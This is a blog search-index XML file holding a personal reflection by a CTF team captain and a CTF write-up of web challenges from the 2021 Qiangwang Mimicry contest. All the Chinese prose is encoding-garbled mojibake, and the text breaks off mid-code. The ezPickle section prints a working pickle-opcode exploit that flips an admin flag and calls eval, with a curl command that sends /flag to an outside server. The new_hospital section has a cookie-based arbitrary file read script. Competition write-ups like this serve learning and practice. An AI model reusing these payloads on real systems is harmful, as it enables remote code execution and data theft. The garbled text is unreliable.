<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>åæœˆ</title>
      <link href="2021/10/27/%E5%8D%81%E6%9C%88/"/>
      <url>2021/10/27/%E5%8D%81%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æƒ³å°æ­‡ä¸€ä¸‹ï¼Œæ•´ç†ä¸€ä¸‹è¿™æ®µæ—¶é—´å¹²çš„ï¼Œæ€è€ƒä¸‹æˆ‘æ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³ä»¥åçš„äº‹ã€‚</p><p>æˆ‘æ˜¯ä¸€ä¸ªå¾ˆæ‡’çš„äººï¼Œç”Ÿæ´»ã€å­¦ä¹ ã€æ€è€ƒï¼Œå¯¹äºæ‰€æœ‰çš„äº‹æƒ…éƒ½æ˜¯è¿™æ ·ï¼Œå°±åƒä¸€ä¸ªç©ä¸–ä¸æ­çš„çº¨ç»”å…¬å­ï¼Œå¿…é¡»è¦æˆ‘æ„Ÿå…´è¶£ï¼Œæˆ–è€…æ˜¯è¢«é€¼ç€ï¼Œæ‰è‚¯å¹²äº‹ã€‚è¿™æ ·ä¸å¥½ï¼Œä¹Ÿä¸€ç›´åœ¨å°è¯•æ”¹å˜è‡ªå·±ï¼Œä»¥å‰çš„è¯ï¼Œå¦‚æœæ²¡æœ‰äººæé†’æˆ‘ç£ä¿ƒæˆ‘ï¼Œé‚£æˆ‘å°±ä¼šæ§åˆ¶ä¸ä½è‡ªå·±å»æ”¾ä¸‹è¦å¹²çš„äº‹ï¼Œç°åœ¨æˆ‘ä¼šç»™è‡ªå·±æ–½åŠ ä¸€äº›æˆ–ç§¯ææˆ–æ¶ˆæçš„å¿ƒç†æš—ç¤ºï¼Œé€¼è¿«è‡ªå·±å»å­¦ä¹ ï¼Œå‹æŠ‘å¿ƒæ€§æ˜¯å¾ˆéš¾çš„äº‹ï¼Œæˆ‘å¾ˆå®¹æ˜“å—ç¯å¢ƒå½±å“ï¼Œåˆå¾ˆå–œæ¬¢æƒ³ä¸€äº›æœ‰çš„æ²¡çš„çš„äº‹ï¼Œæˆ‘éœ€è¦æ›´æˆç†Ÿä¸€äº›ã€‚</p><p>ç‰¹åˆ«æƒ³è°­æ€»ï¼Œä»¥å‰å¸¦é˜Ÿä¸éœ€è¦æ‹…å¿ƒï¼Œæˆ‘åªéœ€è¦è·Ÿåœ¨è°­æ€»åé¢åšå°è·Ÿç­å°±å¥½äº†ï¼Œçœ‹ç€è°­æ€»æ“ä½œï¼Œå­¦å¥½å°±å®Œäº‹äº†ã€‚æ¯”èµ›çš„æ—¶å€™ä¹Ÿä¸éœ€è¦æƒ³é‚£ä¹ˆå¤šï¼Œæœ‰è°­æ€»åœ¨å‘¢ï¼Œæ²¡é‚£ä¹ˆå¤šå‹åŠ›ï¼Œå¤§ä¸äº†å°±æ˜¯çˆ†ä¸ªé›¶ï¼Œå†è¯´äº†æœ‰è°­æ€»åœ¨å‘¢ï¼Œä¸€ç›´éƒ½æ˜¯åœ¨å¿ƒé‡Œæƒ³ç€è°­æ€»å•¥éƒ½ä¼šï¼Œéƒ½æœå¾—åˆ°ï¼Œæ¯æ¬¡é‡åˆ°ä¸ä¼šçš„ï¼Œä¹Ÿä¸è‚¯å»å¤šæœå¤šæƒ³ï¼Œä¸€ç›´éƒ½æ˜¯ç­‰è°­æ€»çš„è¯´æ³•äº†ã€‚</p><p>ä½†æ˜¯è¿™æ ·ä¸å¯èƒ½æœ‰æˆé•¿å“‡ï¼Œè¦æ˜¯ä¸€ç›´è¿™æ ·ï¼Œæˆ‘æ€ä¹ˆé…å¸¦é˜Ÿå“‡ï¼Œé‚£ä¸å°±æ˜¯ä¸€ä¸ªçº¯æ··å­äº†å’©ï¼Œå¦‚æœè¿™æ ·ä¸‹å»ä¼šè®©å¯¹æˆ‘æŠ±æœ‰å¸Œæœ›çš„é‚£äº›äººå¤±æœ›çš„ã€‚ä¸€å®šè¦åšå‡ºæ”¹å˜ï¼Œä¹‹å‰æƒ°æ€§é¢‘å‘ï¼Œä¸€ç›´çªåœ¨å¯å®¤ä¸æƒ³æ¥å®éªŒå®¤è¿™è¾¹ï¼Œæ‰€æœ‰â€œåœ¨å¯å®¤ä¹Ÿä¸€æ ·æå­¦ä¹ â€çš„æƒ³æ³•éƒ½åªæ˜¯æˆ‘æ‡’æƒ°çš„å€Ÿå£ç½¢äº†ï¼Œäº‹å®ä¸Šåœ¨å¯å®¤é‡Œåˆèƒ½å­¦äº›ä»€ä¹ˆå‘¢ï¼Œå®¤å‹ä»¬éƒ½åœ¨ç©æ¸¸æˆï¼Œé£æ°”æ˜¯æ€æ ·çš„è‡ªå·±ä¸æ¸…æ¥šå—ï¼Œè¿˜æœ‰â€œå¸¦å®¤å‹æå­¦ä¹ â€ï¼Œéš¾é“ä¸å¯ç¬‘å—ï¼Œå·²ç»ä¸¤å¹´äº†ï¼Œæ•ˆæœæ˜¯ä»€ä¹ˆæ ·çš„éš¾é“æ²¡æœ‰Bæ•°å—è‡ªå·±å¿ƒé‡Œï¼Œè¿˜æ˜¯å¤ªæ‡’äº†ï¼Œä¸€æ‡’ï¼Œå°±æƒ³ç˜«ç€ï¼Œå°±æƒ³æ‘†çƒ‚ï¼Œè¿™ä¸å°±æ˜¯åºŸç‰©çš„è½¬åŒ–è¿‡ç¨‹å˜›ã€‚</p><p>ä¸èƒ½ç”¨æ²¡äººç£ä¿ƒæ¥ä½œä¸ºä¸æ€ä¸Šè¿›çš„å€Ÿå£å•Šï¼Œä¸ºä»€ä¹ˆè‡ªå·±çš„å­¦ä¹ è¦åˆ«äººæ¥ç£ä¿ƒå‘¢ï¼Œä¸åº”è¯¥æœ¬æ¥å°±è¦å­¦å¥½çš„å—ï¼Œçœ‹çœ‹è‡ªå·±è¿™ä¸ªæ ·å­ï¼Œæ˜¯å¤§ä½¬å—ï¼Ÿæ˜¾ç„¶ä¸æ˜¯ï¼Œé‚£ä¹ˆåˆ«äººå¤§ä½¬ä¸€ç›´åœ¨å­¦ä¹ ï¼Œæˆ‘åˆå‡­ä»€ä¹ˆè¿™æ ·æ‡’ä¸‹å»å‘¢ï¼Œä¸ºä»€ä¹ˆä¸èƒ½åšæŒä¸‹å»å‘¢ã€‚è‹±è¯­å››çº§æ²¡è¿‡ï¼Œè€ƒç ”æ²¡æœ‰å‡†å¤‡ï¼Œç½‘å®‰å­¦è‰ºä¸ç²¾ï¼Œè¿™æ ·å’Œåœ¨å¯å®¤æ‘†çƒ‚çš„ï¼Œå®é™…ä¸Šæ²¡åŒºåˆ«å–ï¼Œåªæ˜¯ä¸€ä¸ªåœ¨å®éªŒå®¤æ··æ—¥å­æ‘†çƒ‚ï¼Œä¸€ä¸ªåœ¨å¯å®¤å¥½æ­¹è¿˜ç©åˆ°äº†æ¸¸æˆç½¢äº†ã€‚</p><p>å›æƒ³ä¸€ä¸‹æˆ‘çš„å®éªŒå®¤å­¦ä¹ è·¯ç¨‹ï¼Œæœ‰å‡ ä¸ªæŒºé‡è¦çš„è½¬æŠ˜ç‚¹ã€‚</p><p>å…¶ä¸€ï¼Œæ˜¯åˆšå…¥å®éªŒå®¤é‚£æ®µæ—¶é—´ï¼Œç‰¹åˆ«æ˜¯å¯’å‡ï¼Œä¸€è·¯é«˜æ­ŒçŒ›è¿›ï¼Œå­¦ä¹ åŠ²å¤´æœ€å¤§ï¼Œä½†æ˜¯åæ¥è¢«ç–«æƒ…å›°åœ¨å®¶é‡Œï¼Œåˆæ¡èµ·äº†æœ¬æ¥æŠ›ä¸‹çš„æ¸¸æˆï¼Œæ··äº†è¶³è¶³ä¸€ä¸ªå­¦æœŸå’Œæš‘å‡ï¼Œä¸­é—´çš„æ¯”èµ›å…¨éƒ½æ˜¯æ¶ˆæå¯¹å¾…ï¼Œè¿™æ ·çš„åæœå°±æ˜¯å¤ªèœï¼Œåœ¨åé¢çš„å›½èµ›é‡Œå› ä¸ºå·®äº†æˆ‘é‚£é“ web è¿›æ€»å†³ï¼›æ¹–æ¹˜æ¯ä¹Ÿæ˜¯å› ä¸ºæˆ‘å¿˜è®°æ”¹å¯†ç å¯¼è‡´é˜Ÿä¼è¢«æ‰“ç©¿ï¼›NSSC çš„æ—¶å€™ä¸ªäººèµ›å› ä¸ºå¿˜è®°äº† cat å‡ºçš„ php æ–‡ä»¶å†…å®¹ä¸ä¼šç›´æ¥æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œé”™å¤±ç¬¬ä¸€ï¼Œå›¢é˜Ÿèµ›ä¸Šçš„è´¡çŒ®èŠèƒœäºæ— ã€‚</p><p>å…¶äºŒï¼Œå°±æ˜¯æˆ‘è‡ªè§‰å¤ªèœï¼Œæ„Ÿè§‰å­¦å¾—å¾ˆéš¾å—ï¼Œå­¦ä¹ åŠ²å¤´åˆ°äº†è°·åº•çš„æ—¶å€™ï¼Œä¸€æ¬¡æ¯”èµ›ç»“æŸä¹‹åï¼Œè°­æ€»å’Œæˆ‘èŠå¤©ï¼Œå°±å’Œæˆ‘è¯´äº†ä»–å¯¹æˆ‘çš„å¸Œæœ›ï¼Œè¿˜èŠäº†ä¹‹å‰æˆ‘ç ”ç©¶çš„å°æ€è·¯å¯¹é‚£æ¬¡æ¯”èµ›çš„å¸®åŠ©ï¼Œè¯´è¦æˆ‘é¼“èµ·åŠ²æ¥å¥½å¥½æï¼Œç›´æ¥ç»™æˆ‘æ‰“äº†ä¸€å¡è½¦é¸¡è¡€ã€‚</p><p>å…¶ä¸‰ï¼Œæ˜¯å¤§äºŒå¯’å‡åœ¨å®¶å·æ‡’ï¼Œä¸è‚¯å­¦ï¼Œä¸æƒ³å­¦ï¼Œå¼€å­¦ä¹‹åä¹Ÿæ·±æ„Ÿæ²¡å•¥æ„æ€ï¼Œå°±å»æ‰¾é»„æ€»ï¼Œå€Ÿå£è¯´æƒ³å»è€ƒç ”ï¼Œé‚£æ˜¯æœ€æ²¡æœ‰å­¦ä¹ ç›®æ ‡ï¼Œä¹Ÿæ²¡æœ‰å­¦ä¹ åŠ²å¤´çš„æ—¶å€™äº†ï¼Œé»„æ€»é—®äº†æˆ‘ä¸ªé—®é¢˜ï¼ŒæŠŠæˆ‘ä»æ‚¬å´–è¾¹æ‹‰å›æ¥äº†ï¼Œâ€œä½ ç¡®å®šä½ ç°åœ¨å»å‡†å¤‡è€ƒç ”èƒ½åšæŒä¸‹å»å—â€ï¼Œç°åœ¨å†æƒ³èµ·æ¥ï¼ŒçœŸä¸å¯èƒ½åšæŒä¸‹æ¥ï¼Œè¯´ä¸å®šå½“æ—¶å¦‚æœé»„æ€»ä»€ä¹ˆä¹Ÿä¸è¯´ï¼Œæ”¾æˆ‘èµ°ï¼Œé‚£ç°åœ¨æˆ‘åº”è¯¥ä¼šæ¯å¤©åœ¨å¯å®¤æ‰“æ¸¸æˆå§ã€‚</p><p>å…¶å››ï¼Œå½“æ—¶ä¸€ç›´å¾ˆç¼ºä¹è‡ªä¿¡ï¼Œåæ¥æŒºæ€ªçš„å§ï¼Œæ— è®ºæ˜¯å“ªä¸ªæ¯”èµ›æ‰“å¾—å¥½ï¼Œéƒ½å¸¦ç»™ä¸äº†æˆ‘ä»»ä½•é«˜å…´ï¼Œåªæ„Ÿè§‰è‡ªå·±è¶Šæ¥è¶Šèœï¼Œåæ¥åšäº†æŸæ¯”èµ›çš„ä¸€é“é¢˜ï¼Œå…¨åœºé›¶è§£ï¼Œç»ˆäºä¸‰å¤©é‡Œé¢æŠŠå®ƒå¤ç°å‡ºæ¥ï¼Œè€Œä¸”è¿˜æ˜¯ä¸€è¡€ï¼Œå½“æ—¶é‚£ç§æ„Ÿè§‰ï¼Œå°±å¾ˆå¥‡å¦™ï¼Œå½·ä½›è‡ªå·±ä¸€ä¸‹å­å°±èµ·é£äº†ï¼Œè€Œä¸”è¿˜è®¤è¯†äº†å‡ºé¢˜äººå’Œä¸€äº›åˆ«çš„å¸ˆå‚…ï¼Œå°±è‡ªä¿¡ä¸€ä¸‹å­å°±å‡ºæ¥äº†ï¼Œå°±å¾ˆç¥å¥‡ã€‚äºæ˜¯åæ¥çš„ cstc å’Œé“ä¸‰ä¹Ÿæ‹¿åˆ°äº†ä¸é”™çš„æˆç»©ã€‚</p><p>å…¶äº”ï¼Œæ˜¯è‡ªå·±çªç„¶åˆä¸æƒ³æ‰“æ¯”èµ›äº†ï¼Œæƒ³å…»è€äº†ï¼Œä½†æ˜¯æƒ³äº†å¾ˆä¹…åˆæŠŠè‡ªå·±æ‹‰å›æ¥äº†ã€‚</p><p>ä»”ç»†æƒ³æƒ³ï¼Œä¼¼ä¹é™¤å¼€å¤§ä¸€å¯’å‡ï¼Œæˆ‘çš„å…¶å®ƒä¸‰ä¸ªé•¿å‡éƒ½åœ¨æ‘†çƒ‚ï¼Œå”‰â€¦â€¦å›æƒ³äº†è¿™ä¹ˆä¹…ï¼Œçªç„¶å‘ç°è‡ªå·±çš„çŠ¶æ€ä¸€ç›´éƒ½æ˜¯æ²‰æ²‰æµ®æµ®ï¼Œéå¸¸å¤šçš„æ—¶å€™éƒ½æ˜¯çœ‹ç€è‡ªå·±çš„å¿ƒæƒ…åœ¨å†³å®šå­¦ä¸ä¸å­¦ï¼Œæ‰€ä»¥å­¦åˆ°çš„ä¸œè¥¿åˆæµ…ï¼Œè‡ªå·±çš„çŸ¥è¯†é¢ä¹Ÿå¾ˆçª„ï¼Œæ‰ä¼šä¸€ç›´å¾…åœ¨è°­æ€»çš„åº‡è«ä¸‹ï¼Œæ—©å°±è¯¥èµ°å‡ºæ¥äº†ã€‚</p><hr><p>æœ€è¿‘æ‰“äº†æ‹Ÿæ€å¼ºç½‘æ¯ï¼Œå–å¾—äº†ä¸é”™çš„æˆç»©ã€‚åªæ˜¯å¾ˆå¯æƒœçº¿ä¸‹æ²¡äº†ï¼Œæ”¹æˆäº†çº¿ä¸Šï¼Œä¸èƒ½å»å—äº¬æ—…æ¸¸äº†ï¼Œç›´æ¥å“­æ­»å‘œå‘œå‘œã€‚ï¼ˆä½†æ˜¯é˜Ÿå‹å®åœ¨å¤ªæœ‰æ„æ€äº†ï¼‰</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1635323041069558/082a0c708343ea50ddbc7dc688d22244a6690d98.png"></p><p>è¿˜æ‰“äº† Byteï¼Œä¹Ÿæœ‰ä¸ªæŒºæœ‰æ„æ€çš„ï¼Œæ²¡è¿›å±äºæ˜¯å¯æƒœäº†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1635323275546676/6c511c0da3cf6323f23d3e03d9eabce04803a305.png"></p><hr><p>æ¥ä¸‹æ¥ç»§ç»­å¥½å¥½å­¦å§ï¼Œå¸Œæœ›æˆ‘å¯ä»¥æˆä¸ºä¸€ä¸ªåˆæ ¼çš„é˜Ÿé•¿ï¼Œå¸¦å¥½è¿™ä¸ªé˜Ÿï¼Œä¹Ÿæ—©æ—¥æˆä¸ºå¤§ä½¬å§QAQ</p><p>ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ—¢ç„¶æˆ‘å¯ä»¥è¿ç€å››äº”ä¸ªå°æ—¶å¤±è´¥å’Œé‡å¼€å››ç™¾å¤šæ¬¡çš„å†°ä¸ç«ä¹‹èˆåŒä¸€å…³ï¼Œé‚£è¿˜æœ‰ä»€ä¹ˆæˆ‘åšæŒä¸ä¸‹å»çš„äº‹å‘¢ã€‚</p><hr><p>æœ€åéšä¾¿æä¸€å˜´æ„Ÿæƒ…æ–¹é¢</p><p>â€”â€” ä¹ˆå¿…è¦å•Š</p>]]></content>
      
      
      <categories>
          
          <category> çBB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_å¼ºç½‘æ‹Ÿæ€_WP</title>
      <link href="2021/10/25/2021-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-WP/"/>
      <url>2021/10/25/2021-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-WP/</url>
      
        <content type="html"><![CDATA[<p>å…„å¼Ÿå§å¦¹ä»¬å¤ªæ£’äº†ï¼Œæˆ‘æ„¿ç§°ä½ ä»¬ä¸ºæœ€å¼º~æ­å–œ xp xd ~</p><p><img src="https://i.loli.net/2021/10/25/ynUDFjYXPoeR4vg.png"></p><p>åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ Web é¢˜çš„é¢˜è§£å­ã€‚</p><h2 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h2><p>è¿™é¢˜æ˜¯ç­¾åˆ° jsï¼Œæœ¬æ¥ä»¥ä¸ºæŒºå¤æ‚çš„ï¼Œå°±è®©é˜Ÿå‹å»çœ‹äº†ï¼Œç»“æœé˜Ÿå‹ä¹Ÿæƒ³åäº†ï¼Œç¬¬äºŒå¤©æˆ‘çœ‹çš„æ—¶å€™éšä¾¿è¯•äº†ä¸€ä¸‹ readFile(â€˜/flagâ€™)ï¼Œç„¶åå°±æŒºæ„å¤–çš„ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/10/25/wIQOHxUN6bar4Vz.png"></p><h2 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h2><p>é¢˜ç›®ç»™äº†æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template_string, url_for,redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    info = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>pickle ååºåˆ—åŒ–ï¼Œä¸è¿‡ç»™é™å®šäº† module in [â€˜configâ€™] å’Œ â€˜__â€™ï¼Œç„¶åçœ‹çœ‹ config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notadmin=&#123;<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;no&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> notadmin[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd    )</span><br><span class="line">        <span class="built_in">eval</span>(s)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å°è¯•åˆ©ç”¨ c &amp; s æ“ä½œç è¿›è¡Œå…¨å±€å˜é‡è¦†ç›–ï¼Œå°† notadmin ä¸­çš„ admin ä¿®æ”¹ä¸º yes æ‰§è¡Œ eval</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ç”¨ curl æŠŠ flag å¸¦å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿˜æ˜¯ğŸ‹éªš</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://124.71.183.254:32770/&quot;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0(S&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http://106.15.90.116:11451/?fuxk-$(cat /flag | base64)&#x27;)&quot;</span></span><br><span class="line"><span class="string">iconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">session.get(<span class="string">&quot;/&quot;</span>, params=&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: base64.b64encode(data).decode()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/25/h1StUYdHC3cLMRi.png"></p><p>è¿™é‡Œåˆ©ç”¨åˆ°äº† i æ“ä½œç </p><blockquote><p>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</p></blockquote><h2 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h2><p>åŸé¢˜ã€‚ã€‚ã€‚å½“æ—¶æ‰“è¿‡æ¯”èµ›çš„ï¼Œå°±ä¸å†™äº†ï¼Œfrom å¤©ç¿¼æ¯2021 çš„ jackson</p><h2 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h2><p>è¿™é¢˜æœ¬æ¥æ—©å°±å‡ºäº†ï¼Œæˆ‘å‚»é€¼äº†ã€‚ã€‚ã€‚</p><p>å°±æ˜¯è®¿é—® feature.php?id=2 å‘ç°äº† Cookie ä¸­å­˜åœ¨ APIï¼Œbase64 è§£ç åå‘ç°æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å€¼æ‹¼æ¥ .jsï¼ŒåŒæ—¶å‘ç° /old/feature.php ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¿®æ”¹ Cookie ä¸­çš„ API å³å¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å– flag.php å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;API&quot;</span>: <span class="string">&quot;L3Zhci93d3cvaHRtbC9mbGFnLnBocA%3D%3D&quot;</span>&#125;</span><br><span class="line">conn = requests.get(<span class="string">&quot;http://123.60.75.243:32766/old/feature.php&quot;</span>, cookies=cookie)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(conn.text) </span><br></pre></td></tr></table></figure><h2 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h2><p>é¢˜ç›®ç»™å‡ºäº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">    @mkdir(<span class="string">&quot;./files/&quot;</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = bin2hex(random_bytes(<span class="number">5</span>));</span><br><span class="line">    file_put_contents(<span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>,base64_encode(<span class="variable">$content</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;r&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;./files/&quot;</span>.<span class="variable">$r</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;php://filter/resource=<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°­æ€»æ•™çš„ fuzz ä¸€ä¸‹ï¼Œç¬¬ä¸€å¤©æ²¡ fuzz å‡ºæ¥ï¼Œç¬¬äºŒå¤©éšä¾¿è¯•äº†ä¸€ä¸‹å‡ºäº†ï¼Œäººå‚»äº†â€¦â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 